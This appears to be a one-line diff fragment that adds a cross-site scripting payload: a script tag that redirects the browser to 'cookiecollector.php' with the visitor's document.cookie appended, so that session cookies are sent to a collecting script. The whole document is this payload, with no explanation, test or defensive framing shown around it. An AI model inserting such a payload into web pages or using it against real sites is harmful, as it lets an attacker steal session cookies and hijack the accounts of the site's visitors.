@@ -1,0 +1,1 @@
+<script>document.location='cookiecollector.php?cookie='+document.cookie</script>
